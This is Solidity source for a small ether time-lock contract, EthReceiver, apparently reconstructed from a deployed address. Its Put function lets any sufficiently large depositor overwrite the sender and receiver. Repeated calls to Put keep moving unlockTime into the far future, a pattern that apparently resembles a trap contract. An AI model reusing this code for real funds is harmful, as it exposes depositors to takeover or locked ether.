/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EthReceiver at 0xc1d73e148590b60ce9dd42d141f9b27bbad07879
*/
pragma solidity ^0.4.22;

contract EthReceiver
{
    bool closed = false;
    uint unlockTime = 43200;
    address sender;
    address receiver;
 
    function Put(address _receiver) public payable {
        if ((!closed && msg.value > 0.5 ether) || sender == 0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime += now;
        }
    }
    
    function SetTime(uint _unixTime) public {
        if (msg.sender == sender) {
            unlockTime = _unixTime;
        }
    }
    
    function Get() public payable {
        if (receiver == msg.sender && now >= unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    
    function Close() public {
        if (sender == msg.sender) {
           closed=true;
        }
    }

    function() public payable { }
}